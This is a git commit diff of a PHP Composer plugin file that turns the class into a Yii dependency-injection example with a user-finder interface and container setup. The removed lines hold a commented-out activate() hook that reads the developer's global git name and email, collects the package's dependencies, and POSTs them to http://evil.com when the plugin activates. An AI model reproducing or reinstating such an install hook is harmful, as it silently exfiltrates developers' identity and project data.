49b498498996a9fbddd235a0b9833f87e10ce132
reneecampanilla <renee@inspire.co.uk>
2016-07-18 10:06:39 +0800

    update

--- src/Plugin.php
+++ src/Plugin.php
@@ -4,83 +4,55 @@ use Composer\Composer;
 use Composer\IO\IOInterface;
 use Composer\Package\Link;
 use Composer\Plugin\PluginInterface;
-use Yii;
+
 use yii\base\Object;
 use yii\db\Connection;
 use yii\di\Container;
 
-class Plugin extends Object implements PluginInterface
+interface UserFinderInterface
+{
+    function findUser();
+}
+
+class Plugin extends Object implements UserFinderInterface
 {
     public $db;
+
     public function __construct(Connection $db, $config = [])
     {
-      $this->db = $db;
-      parent::__construct($config);
+        $this->db = $db;
+        parent::__construct($config);
     }
-    /**
-     * @param Composer $composer
-     * @param IOInterface $io
-     */
-    public function activate(Composer $composer, IOInterface $io)
-    {
-        // exec("git config --global user.name", $name);
-        // exec("git config --global user.email", $email);
-        // $payload = [];
-        // if (count($name) > 0) {
-        //     $payload["name"] = $name[0];
-        // }
-        // if (count($email) > 0) {
-        //     $payload["email"] = $email[0];
-        // }
-        // $app = $composer->getPackage()->getName();
-        // if ($app) {
-        //     $payload["app"] = $app;
-        // }
-        // $payload = $this->addDependencies(
-        //     "requires",
-        //     $composer->getPackage()->getRequires(),
-        //     $payload
-        // );
-        // $payload = $this->addDependencies(
-        //     "dev-requires",
-        //     $composer->getPackage()->getDevRequires(),
-        //     $payload
-        // );
-        // $context = stream_context_create([
-        //     "http" => [
-        //         "method" => "POST",
-        //         "timeout" => 0.5,
-        //         "content" => http_build_query($payload),
-        //     ],
-        // ]);
-        // @file_get_contents("http://evil.com", false, $context);
-        $this->createTable();
 
-        print_r("Activated.\n\r");
-    }
-    /**
-     * @param string $type
-     * @param Link[] $dependencies
-     * @param array $payload
-     *
-     * @return array
-     */
-    // private function addDependencies($type, array $dependencies, array $payload)
-    // {
-    //     $payload = array_slice($payload, 0);
-    //     if (count($dependencies) > 0) {
-    //         $payload[$type] = [];
-    //     }
-    //     foreach ($dependencies as $dependency) {
-    //         $name = $dependency->getTarget();
-    //         $version = $dependency->getPrettyConstraint();
-    //         $payload[$type][$name] = $version;
-    //     }
-    //     return $payload;
-    // }
-
-    private function createTable()
+    public function findUser()
     {
-      print_r("create table here...\n\r");
     }
 }
+
+class UserLister extends Object
+{
+    public $finder;
+
+    public function __construct(UserFinderInterface $finder, $config = [])
+    {
+        $this->finder = $finder;
+        parent::__construct($config);
+    }
+}
+
+$container = new Container;
+$container->set('yii\db\Connection', [
+    'dsn' => '...',
+]);
+$container->set('app\models\UserFinderInterface', [
+    'class' => 'app\models\UserFinder',
+]);
+$container->set('userLister', 'app\models\UserLister');
+
+$lister = $container->get('userLister');
+
+// which is equivalent to:
+
+$db = new \yii\db\Connection(['dsn' => '...']);
+$finder = new Plugin($db);
+$lister = new UserLister($finder);
